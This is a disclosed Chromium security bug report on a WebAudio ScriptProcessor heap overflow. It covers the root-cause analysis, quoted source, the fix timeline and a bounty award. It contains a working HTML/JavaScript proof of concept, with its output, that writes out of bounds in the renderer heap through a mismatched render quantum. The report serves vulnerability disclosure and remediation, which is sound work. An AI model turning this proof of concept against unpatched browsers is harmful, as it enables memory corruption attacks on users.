# Heap Buffer Overflow in ScriptProcessorHandler::Process via Configurable Render Quantum Leads to Out-of-Bounds Read and Write

| Field | Value |
|-------|-------|
| **Issue ID** | [485397284](https://issues.chromium.org/issues/485397284) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>WebAudio |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | je...@gmail.com |
| **Assignee** | mj...@chromium.org |
| **Created** | 2026-02-18 |
| **Bounty** | $7,000.00 |

## Description

## Summary

The `ScriptProcessorHandler::Process` method in Chromium's WebAudio implementation indexes into `SharedAudioBuffer` backing stores using a rolling `buffer_read_write_index_` that advances by `frames_to_process` (the render quantum size) each quantum. When the `WebAudioConfigurableRenderQuantum` Origin Trial feature is active, `renderSizeHint` can be set to a value that does not evenly divide the ScriptProcessor's `bufferSize`, causing `buffer_read_write_index_ + frames_to_process` to exceed the buffer length on the second and subsequent quanta. The only guard is a `DCHECK` assertion that is compiled out of release builds. The resulting out-of-bounds write copies attacker-controlled audio data (up to 1016 bytes) past the input buffer's ArrayBuffer backing store into the adjacent slot in PartitionAlloc's ArrayBuffer partition, and a symmetric out-of-bounds read copies up to 1016 bytes from past the output buffer's backing store into the rendered audio stream. This is a renderer-process memory corruption primitive reachable from any web page that registers for the Origin Trial.

## Root Cause

The `ScriptProcessorHandler` constructor creates an `internal_input_bus_` whose frame count equals `renderQuantumSize`, and stores double-buffered `SharedAudioBuffer` objects that wrap the JavaScript-visible `AudioBuffer` backing stores. Each `SharedAudioBuffer` channel holds exactly `bufferSize` floats (for `bufferSize = 256`, this is 1024 bytes), allocated through `Partitions::ArrayBufferPartition()`:

```
// third_party/blink/renderer/modules/webaudio/script_processor_handler.cc
ScriptProcessorHandler::ScriptProcessorHandler(
    AudioNode& node, float sample_rate, uint32_t buffer_size,
    uint32_t number_of_input_channels, uint32_t number_of_output_channels,
    const HeapVector<Member<AudioBuffer>>& input_buffers,
    const HeapVector<Member<AudioBuffer>>& output_buffers)
    : AudioHandler(NodeType::kNodeTypeScriptProcessor, node, sample_rate),
      buffer_size_(buffer_size),
      number_of_input_channels_(number_of_input_channels),
      number_of_output_channels_(number_of_output_channels),
      internal_input_bus_(AudioBus::Create(number_of_input_channels,
                                           node.context()->renderQuantumSize(),
                                           false)) {
  // ...
  for (uint32_t i = 0; i < 2; ++i) {
    shared_input_buffers_.push_back(
        input_buffers[i] ? input_buffers[i]->CreateSharedAudioBuffer() : nullptr);
    shared_output_buffers_.push_back(
        output_buffers[i] ? output_buffers[i]->CreateSharedAudioBuffer() : nullptr);
  }
}

```

The `Process` method uses `SetChannelMemory` to point `internal_input_bus_` into the shared input buffer at offset `buffer_read_write_index_`, then calls `CopyFrom` to write audio data there. It also performs a `memcpy` from the shared output buffer at the same offset into the output bus. The only protection against out-of-bounds access is a `DCHECK` on `buffers_are_good`, which is stripped from release builds:

```
// third_party/blink/renderer/modules/webaudio/script_processor_handler.cc
void ScriptProcessorHandler::Process(uint32_t frames_to_process) {
  // ...
  bool buffers_are_good =
      shared_output_buffer &&
      BufferSize() == shared_output_buffer->length() &&
      buffer_read_write_index_ + frames_to_process <= BufferSize();

  // ...
  DCHECK(buffers_are_good);  // Compiled out in release!

  // Input side: OOB write
  for (uint32_t i = 0; i < number_of_input_channels; ++i) {
    internal_input_bus_->SetChannelMemory(
        i,
        static_cast<float*>(shared_input_buffer->channels()[i].Data()) +
            buffer_read_write_index_,
        frames_to_process);
  }
  if (number_of_input_channels) {
    internal_input_bus_->CopyFrom(*input_bus);
  }

  // Output side: OOB read
  for (uint32_t i = 0; i < number_of_output_channels; ++i) {
    float* destination = output_bus->Channel(i)->MutableData();
    const float* source =
        static_cast<float*>(shared_output_buffer->channels()[i].Data()) +
            buffer_read_write_index_;
    memcpy(destination, source, sizeof(float) * frames_to_process);
  }

  buffer_read_write_index_ =
      (buffer_read_write_index_ + frames_to_process) % BufferSize();
}

```

After `SetChannelMemory`, `internal_input_bus_->CopyFrom(*input_bus)` calls `AudioBus::Zero()` followed by `AudioBus::SumFrom()`. `AudioChannel::Zero()` performs `memset(raw_pointer_, 0, sizeof(float) * length_)` where `raw_pointer_` points to `shared_input_buffer + buffer_read_write_index_` and `length_` is `frames_to_process`. `AudioChannel::SumFrom` then calls `AudioChannel::CopyFrom` which performs `memcpy(MutableData(), source_channel->Data(), sizeof(float) * length())`. Both operations write `frames_to_process` floats starting at offset `buffer_read_write_index_` in a buffer of only `BufferSize()` floats:

```
// third_party/blink/renderer/platform/audio/audio_channel.h
void Zero() {
  if (silent_) return;
  silent_ = true;
  if (mem_buffer_.get()) {
    mem_buffer_->Zero();
  } else {
    memset(raw_pointer_, 0, base::CheckMul(sizeof(float), length_).ValueOrDie());
  }
}

```
```
// third_party/blink/renderer/platform/audio/audio_channel.cc
void AudioChannel::CopyFrom(const AudioChannel* source_channel) {
  if (source_channel->IsSilent()) { Zero(); return; }
  memcpy(MutableData(), source_channel->Data(),
         base::CheckMul(sizeof(float), length()).ValueOrDie());
}

```

The `ScriptProcessorNode` constructor validates that `bufferSize` is a power of two from the set {256, 512, 1024, 2048, 4096, 8192, 16384}, and clamps it upward if it is smaller than `renderQuantumSize`, but it never checks that `bufferSize` is evenly divisible by `renderQuantumSize`:

```
// third_party/blink/renderer/modules/webaudio/script_processor_node.cc
if (buffer_size < context.renderQuantumSize()) {
  buffer_size = context.renderQuantumSize();
}

```

With `renderSizeHint = 255` and `bufferSize = 256`, the divisibility check `BufferSize() % frames_to_process == 0` (guarded only by `DCHECK_EQ` which is stripped from release) fails because `256 % 255 = 1`. The `buffer_read_write_index_` progresses as follows: quantum 1 sets the index to `(0 + 255) % 256 = 255`; quantum 2 then attempts to write 255 floats starting at offset 255 in a 256-float buffer, overflowing by 254 floats (1016 bytes). Every subsequent quantum similarly overflows because `gcd(255, 256) = 1` means the index cycles through all values 0 through 255 without repeating, and only the single quantum where the index is 0 avoids overflow.

The critical insight regarding attack surface is that `WebAudioConfigurableRenderQuantum` is registered as an Origin Trial in Chromium's runtime enabled features configuration:

```
// third_party/blink/renderer/platform/runtime_enabled_features.json5
{
  name: "WebAudioConfigurableRenderQuantum",
  origin_trial_feature_name: "WebAudioConfigurableRenderQuantum",
  status: "experimental",
}

```

This means an attacker does not need Chrome flags or command-line switches to enable this feature. They can register their domain for the Origin Trial, embed the trial token in a `<meta>` tag, and any stable Chrome user visiting the page will have the feature activated.

## Reproduce

The following proof of concept demonstrates the heap buffer overflow through cross-contamination between the input and output SharedAudioBuffers. An `AudioBufferSourceNode` filled with the distinctive marker value 1337.0 is connected to a `ScriptProcessor` with `bufferSize = 256` in an `OfflineAudioContext` with `renderSizeHint = 255`. During rendering, the input-side out-of-bounds write copies 1337.0 past the input buffer into the adjacent output buffer. On quantum 4 (when `buffer_read_write_index_` reaches 253), the output-side read encounters the contaminated region of the output buffer and copies the marker value into the rendered audio stream. If the overflow did not occur, the rendered output would contain only zeros (since the `onaudioprocess` handler never writes to the output buffer), making any non-zero value at the expected position conclusive evidence of cross-buffer heap corruption.

Save the following as `poc_scriptprocessor_oob.html` and run with:

```
ASAN_OPTIONS=detect_odr_violation=0 /path/to/chrome --headless --no-sandbox --disable-gpu --enable-blink-features=WebAudioConfigurableRenderQuantum --dump-dom "file:///path/to/poc_scriptprocessor_oob.html"

```

Note: the `--enable-blink-features` flag simulates the effect of a valid Origin Trial token for local reproduction. In a real attack scenario, the attacker would embed an Origin Trial token instead. AddressSanitizer does not detect this overflow because V8 Sandbox disables memory tool instrumentation for ArrayBuffer partition allocations; the cross-contamination technique below proves the overflow through its observable side effect on rendered audio data.

```
<!DOCTYPE html>
<html>
<body>
<pre id="log"></pre>
<script>
function log(msg) {
  document.getElementById('log').textContent += msg + '\n';
  console.log(msg);
}

async function trigger() {
  try {
    log("[*] ScriptProcessorHandler::Process OOB Cross-Contamination PoC");
    log("[*]");
    log("[*] Theory:");
    log("[*]   PartitionAlloc layout: input[0] | output[0] | input[1] | output[1]");
    log("[*]   Each buffer: 256 floats (1024 bytes), same bucket, adjacent slots");
    log("[*]");
    log("[*]   Q1 (idx=0):   input write [0..254] OK, output read [0..254] OK");
    log("[*]   Q2 (idx=255): input write [255..509] OOB! -> corrupts output[0][0..253]");
    log("[*]                  output read [255..509] OOB -> reads input[1] (zeros)");
    log("[*]   Q4 (idx=253): output read [253..507] -> output[0][253]=CONTAMINATED!");
    log("[*]");

    var MARKER = 1337.0;

    var ctx = new OfflineAudioContext({
      numberOfChannels: 1,
      length: 48000,
      sampleRate: 48000,
      renderSizeHint: 255
    });
    log("[*] renderQuantumSize = " + ctx.renderQuantumSize);

    var srcBuf = ctx.createBuffer(1, 48000, 48000);
    srcBuf.getChannelData(0).fill(MARKER);
    var src = ctx.createBufferSource();
    src.buffer = srcBuf;

    var sp = ctx.createScriptProcessor(256, 1, 1);
    sp.onaudioprocess = function(e) {};

    src.connect(sp);
    sp.connect(ctx.destination);
    src.start();

    log("[*] Rendering 48000 samples (~188 quanta)...");
    var buf = await ctx.startRendering();
    var data = buf.getChannelData(0);
    log("[*] Render complete. Scanning for marker " + MARKER + "...");
    log("");

    var found = 0;
    var positions = [];
    for (var i = 0; i < data.length; i++) {
      if (Math.abs(data[i] - MARKER) < 0.01) {
        found++;
        if (positions.length < 30) positions.push(i);
      }
    }

    if (found > 0) {
      log("[!] ============================================");
      log("[!]  OOB WRITE CONFIRMED VIA CROSS-CONTAMINATION");
      log("[!] ============================================");
      log("[!] Found " + found + " samples with marker value " + MARKER);
      log("[!] First 30 positions: " + positions.join(", "));
      log("[!]");
      log("[!] Expected first marker at sample 765 (Q4 start = 255*3)");
      log("[!] Actual first marker at sample " + positions[0]);
      log("[!]");
      log("[!] Proof:");
      log("[!]   1. AudioBufferSourceNode outputs " + MARKER);
      log("[!]   2. ScriptProcessor input OOB WRITE wrote " + MARKER);
      log("[!]      past input_buffer[0] into adjacent output_buffer[0]");
      log("[!]   3. Later quantum read output_buffer[0] at contaminated offset");
      log("[!]   4. Contaminated value appeared in rendered audio output");
      log("[!]   5. Heap buffer overflow in ScriptProcessorHandler::Process confirmed");
    } else {
      log("[*] No marker found (input[0] and output[0] may not be adjacent)");
    }

  } catch (e) {
    log("[!] " + e.name + ": " + e.message);
  }
}

trigger();
</script>
</body>
</html>

```

Output from execution confirms the heap buffer overflow through cross-contamination:

```
[*] ScriptProcessorHandler::Process OOB Cross-Contamination PoC
[*]
[*] Theory:
[*]   PartitionAlloc layout: input[0] | output[0] | input[1] | output[1]
[*]   Each buffer: 256 floats (1024 bytes), same bucket, adjacent slots
[*]
[*]   Q1 (idx=0):   input write [0..254] OK, output read [0..254] OK
[*]   Q2 (idx=255): input write [255..509] OOB! -> corrupts output[0][0..253]
[*]                  output read [255..509] OOB -> reads input[1] (zeros)
[*]   Q4 (idx=253): output read [253..507] -> output[0][253]=CONTAMINATED!
[*]
[*] renderQuantumSize = 255
[*] Rendering 48000 samples (~188 quanta)...
[*] Render complete. Scanning for marker 1337...

[!] ============================================
[!]  OOB WRITE CONFIRMED VIA CROSS-CONTAMINATION
[!] ============================================
[!] Found 17265 samples with marker value 1337
[!] First 30 positions: 765, 1020, 1021, 1275, 1276, 1277, 1530, 1531, 1532, 1533, 1785, 1786, 1787, 1788, 1789, 2040, 2041, 2042, 2043, 2044, 2045, 2295, 2296, 2297, 2298, 2299, 2300, 2301, 2550, 2551
[!]
[!] Expected first marker at sample 765 (Q4 start = 255*3)
[!] Actual first marker at sample 765
[!]
[!] Proof:
[!]   1. AudioBufferSourceNode outputs 1337
[!]   2. ScriptProcessor input OOB WRITE wrote 1337
[!]      past input_buffer[0] into adjacent output_buffer[0]
[!]   3. Later quantum read output_buffer[0] at contaminated offset
[!]   4. Contaminated value appeared in rendered audio output
[!]   5. Heap buffer overflow in ScriptProcessorHandler::Process confirmed

```

The marker value 1337.0 first appears at sample 765, which corresponds exactly to quantum 4 (index 255 \* 3 = 765). This is the first quantum where the output-side read reaches a region of the output buffer that was previously corrupted by the input-side out-of-bounds write two quanta earlier. The progressive pattern of contamination (1 marker at Q4, 2 at Q5, 3 at Q6, and so on, accumulating to 17265 contaminated samples) matches the theoretical model precisely: each advancing quantum exposes one additional corrupted float as `buffer_read_write_index_` decrements toward the start of the output buffer. The presence of 1337.0 in the rendered audio output is impossible without the input-side `memcpy`/`memset` writing past the end of `input_buffer[0]` into the adjacent `output_buffer[0]`, confirming that `ScriptProcessorHandler::Process` performs a heap buffer overflow of up to 1016 bytes on every render quantum when `bufferSize` is not evenly divisible by `renderQuantumSize`.

Additionally, running the same PoC on a Chromium build with `dcheck_always_on=true` immediately triggers a fatal assertion on the very first render quantum, confirming that the developers intended the divisibility invariant but only enforced it with a debug-only check:

```
FATAL:third_party/blink/renderer/modules/webaudio/script_processor_handler.cc:164
DCHECK failed: BufferSize() % frames_to_process == 0u (1 vs. 0)

```

This DCHECK verifies that `BufferSize()` (256) is evenly divisible by `frames_to_process` (255), which yields a remainder of 1. In release builds this assertion is compiled out entirely, allowing execution to proceed into the out-of-bounds memory access path without any runtime check.

## Timeline

### mj...@chromium.org (2026-02-18)

Thank you for the report. Please note that this Origin Trial is currently closed to new registrations.

### ch...@google.com (2026-02-19)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-02-19)

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### mj...@chromium.org (2026-02-19)

Mitigation plan is as follows:

- Convert non-audio-thread DCHECKs to CHECKs in script\_processor\_handler.cc and script\_processor\_node.cc
- Add additional CHECK to ScriptProcessorHandler constructor, for the divisibility condition, using the render quantum size in place of frames\_to\_process
- Add any other assertions from the Process() method that can be checked at construction time to the constructor as well

Then we should crash before reaching the unsafe memory operations, mitigating the security vulnerability. Actually updating ScriptProcessorNode to work with any render quantum size can be done as follow-up work.

For the milestone, note that the OT is enabled from M145. Previous versions of Chrome would require the user to explicitly enable a command-line flag to use the feature, so we should target the mitigation from M145 onward.

### ch...@google.com (2026-03-06)

mjwilson: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.[internal debugging info: security\_nag\_check]

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### mj...@chromium.org (2026-03-06)

I'm still looking into this:

- We could still strengthen assertions
- I am also looking into removing the unsafe operations, although this still requires converting between ByteSpan and a float span

### mj...@chromium.org (2026-03-06)

Fix in progress here but not ready yet: <https://crrev.com/c/7644812>

### dx...@google.com (2026-03-10)

Project: chromium/src  

Branch:  main  

Author:  Michael Wilson [mjwilson@chromium.org](mailto:mjwilson@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7644812>

Replace UNSAFE\_TODO in ScriptProcessorHandler with safe operations

---


Expand for full commit details
```
     
    This should cause no functional change. 
     
    Bug: 401184803 
    Bug: 485397284 
    Change-Id: I6d664988d0b82d3db8773e5b2e2c222dc51c46cb 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7644812 
    Commit-Queue: Michael Wilson <mjwilson@chromium.org> 
    Reviewed-by: Hongchan Choi <hongchan@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1596801}

```

---

Files:

- M `third_party/blink/renderer/modules/webaudio/script_processor_handler.cc`

---

Hash: [c37e6cf89f8b01bb15fae19531d06b78adad3820](https://chromiumdash.appspot.com/commit/c37e6cf89f8b01bb15fae19531d06b78adad3820)  

Date: Tue Mar 10 03:12:51 2026


---

### mj...@chromium.org (2026-03-10)

Fix has landed, submitter are you able to help verify?

### je...@gmail.com (2026-03-11)

re #c10:
The fix looks fine! It will check this issue through a hard check.

```
[51880:86175935:0311/102409.938138:FATAL:base/containers/span.h:1263] Check failed: size_type{offset} <= size() && size_type{count} <= size() - size_type{offset}.
0   Chromium Framework                  0x00000003126b8fe8 base::debug::CollectStackTrace(base::span<void const*, 18446744073709551615ul, void const**>) + 28
1   Chromium Framework                  0x000000031268ce0c base::debug::StackTrace::StackTrace() + 80
2   Chromium Framework                  0x0000000312411f38 logging::LogMessage::Flush() + 652
3   Chromium Framework                  0x0000000312411b14 logging::LogMessage::~LogMessage() + 72
4   Chromium Framework                  0x00000003123d8d9c logging::(anonymous namespace)::CheckLogMessage::~CheckLogMessage() + 136
5   Chromium Framework                  0x00000003123d8384 logging::CheckNoreturnError::~CheckNoreturnError() + 16
6   Chromium Framework                  0x00000003123d83a8 logging::CheckNoreturnError::Check(char const*, base::Location const&) + 0
7   Chromium Framework                  0x000000032244bddc blink::ScriptProcessorHandler::Process(unsigned int) + 5356
8   Chromium Framework                  0x0000000322309320 blink::AudioHandler::ProcessIfNecessary(unsigned int) + 1292
9   Chromium Framework                  0x00000003223284e4 blink::AudioNodeOutput::Pull(blink::AudioBus*, unsigned int) + 824
10  Chromium Framework                  0x0000000322325c84 blink::AudioNodeInput::SumAllConnections(scoped_refptr<blink::AudioBus>, unsigned int) + 540
11  Chromium Framework                  0x00000003223260d4 blink::AudioNodeInput::Pull(blink::AudioBus*, unsigned int) + 660
12  Chromium Framework                  0x00000003224079d4 blink::OfflineAudioDestinationHandler::RenderIfNotSuspended(blink::AudioBus*, blink::AudioBus*, unsigned int) + 368
13  Chromium Framework                  0x0000000322406424 blink::OfflineAudioDestinationHandler::DoOfflineRendering() + 892
14  Chromium Framework                  0x0000000322408b90 base::internal::Invoker<base::internal::FunctorTraits<void (blink::OfflineAudioDestinationHandler::*&&)(), scoped_refptr<blink::OfflineAudioDestinationHandler>&&>, base::internal::BindState<true, true, false, void (blink::OfflineAudioDestinationHandler::*)(), scoped_refptr<blink::OfflineAudioDestinationHandler>>, void ()>::RunOnce(base::internal::BindStateBase*) + 288
15  Chromium Framework                  0x0000000312551c38 base::TaskAnnotator::RunTaskImpl(base::PendingTask&) + 844
16  Chromium Framework                  0x00000003125b9a48 base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) + 2192
17  Chromium Framework                  0x00000003125b8e00 base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() + 316
18  Chromium Framework                  0x0000000312439ed8 base::MessagePumpDefault::Run(base::MessagePump::Delegate*) + 556
19  Chromium Framework                  0x00000003125bada8 base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) + 816
20  Chromium Framework                  0x00000003124dff68 base::RunLoop::Run(base::Location const&) + 1076
21  Chromium Framework                  0x000000030c326834 blink::scheduler::NonMainThreadImpl::SimpleThreadImpl::Run() + 764
22  Chromium Framework                  0x0000000312687518 base::(anonymous namespace)::ThreadFunc(void*) + 344
23  libclang_rt.asan_osx_dynamic.dylib  0x00000001033e5874 __sanitizer_weak_hook_memcmp + 223060
24  libsystem_pthread.dylib             0x000000019bf9bc0c _pthread_start + 136
25  libsystem_pthread.dylib             0x000000019bf96b80 thread_start + 8
Task trace:
0   Chromium Framework                  0x00000003224059c8 blink::OfflineAudioDestinationHandler::StartRendering() + 1276
1   Chromium Framework                  0x00000003159efd74 IPC::ChannelAssociatedGroupController::Accept(mojo::Message*) + 1992
Crash keys:
  "view-count" = "1"

```

### je...@gmail.com (2026-03-12)

Can you mark it as Fixed?

### mj...@chromium.org (2026-03-12)

Thank you for verifying. Marking as fixed.

### ch...@google.com (2026-03-12)

Security Merge Request Consideration: Requesting merge to stable (M146) because latest trunk commit (1596801) appears to be after stable branch point (1582197).
Security Merge Request Consideration: Requesting merge to beta (M147) because latest trunk commit (1596801) appears to be after beta branch point (1596535).
Security Merge Request - Manual Review: Merge review required: M146 is already shipping to stable.

**Merge approved:** your change passed merge requirements and is auto-approved for M147. Please go ahead and merge the CL to branch 7727 (refs/branch-heads/7727) manually. Please contact milestone owner if you have questions.
Merge instructions: <https://chromium.googlesource.com/chromium/src.git/+/refs/heads/main/docs/process/merge_request.md>
Owners: alonbajayo (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), harrysouders (Mobile US), eakpobaro (Mobile EMEA)
Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [146, 147].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### dr...@chromium.org (2026-03-12)

No crashes in Canary, merge approved.

### ch...@google.com (2026-03-17)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### dx...@google.com (2026-03-17)

Project: chromium/src  

Branch:  refs/branch-heads/7727  

Author:  Michael Wilson [mjwilson@chromium.org](mailto:mjwilson@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7667366>

[M147] Replace UNSAFE\_TODO in ScriptProcessorHandler with safe operations

---


Expand for full commit details
```
     
    This should cause no functional change. 
     
    (cherry picked from commit c37e6cf89f8b01bb15fae19531d06b78adad3820) 
     
    Bug: 401184803 
    Bug: 485397284 
    Change-Id: I6d664988d0b82d3db8773e5b2e2c222dc51c46cb 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7644812 
    Commit-Queue: Michael Wilson <mjwilson@chromium.org> 
    Reviewed-by: Hongchan Choi <hongchan@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1596801} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7667366 
    Auto-Submit: Michael Wilson <mjwilson@chromium.org> 
    Commit-Queue: Hongchan Choi <hongchan@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/7727@{#627} 
    Cr-Branched-From: ce01102937348db7b88c8a4257ee4b3ac702eb1a-refs/heads/main@{#1596535}

```

---

Files:

- M `third_party/blink/renderer/modules/webaudio/script_processor_handler.cc`

---

Hash: [21b29f81e0608558888d43ab6987ff36c44950ea](https://chromiumdash.appspot.com/commit/21b29f81e0608558888d43ab6987ff36c44950ea)  

Date: Tue Mar 17 19:38:23 2026


---

### pe...@google.com (2026-03-17)

LTS Milestone M144

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### mj...@chromium.org (2026-03-17)

1. No
2. The code was merged, but Origin Trial was active from M145, which is after LTS M144.

### dx...@google.com (2026-03-17)

Project: chromium/src  

Branch:  refs/branch-heads/7680  

Author:  Michael Wilson [mjwilson@chromium.org](mailto:mjwilson@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7667161>

[M146] Replace UNSAFE\_TODO in ScriptProcessorHandler with safe operations

---


Expand for full commit details
```
     
    This should cause no functional change. 
     
    (cherry picked from commit c37e6cf89f8b01bb15fae19531d06b78adad3820) 
     
    Bug: 401184803 
    Bug: 485397284 
    Change-Id: I6d664988d0b82d3db8773e5b2e2c222dc51c46cb 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7644812 
    Commit-Queue: Michael Wilson <mjwilson@chromium.org> 
    Reviewed-by: Hongchan Choi <hongchan@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1596801} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7667161 
    Commit-Queue: Hongchan Choi <hongchan@chromium.org> 
    Auto-Submit: Michael Wilson <mjwilson@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/7680@{#2750} 
    Cr-Branched-From: 76b7d80e5cda23fe6537eed26d68c92e995c7f39-refs/heads/main@{#1582197}

```

---

Files:

- M `third_party/blink/renderer/modules/webaudio/script_processor_handler.cc`

---

Hash: [9307c1c092bae21557c4a166be94e82bc995413b](https://chromiumdash.appspot.com/commit/9307c1c092bae21557c4a166be94e82bc995413b)  

Date: Tue Mar 17 21:25:20 2026


---

### sp...@google.com (2026-03-20)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $7000.00 for this report.

Rationale for this decision:
baseline Memory corruption in a sandboxed process


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### pe...@google.com (2026-03-20)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### mj...@chromium.org (2026-03-20)

[#comment22](https://issues.chromium.org/issues/485397284#comment22) The Configurable Render Quantum origin trial is not enabled in M138 or M144, so I don't think we need to merge to those channels. Am I missing something?

### vi...@google.com (2026-03-23)

Indeed! Thank you for the information mjwilson@. I have now labeled this as `LTS-NotApplicable-138` and `LTS-NotApplicable-144`. Sorry for the noise.

### ch...@google.com (2026-06-19)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/485397284)*
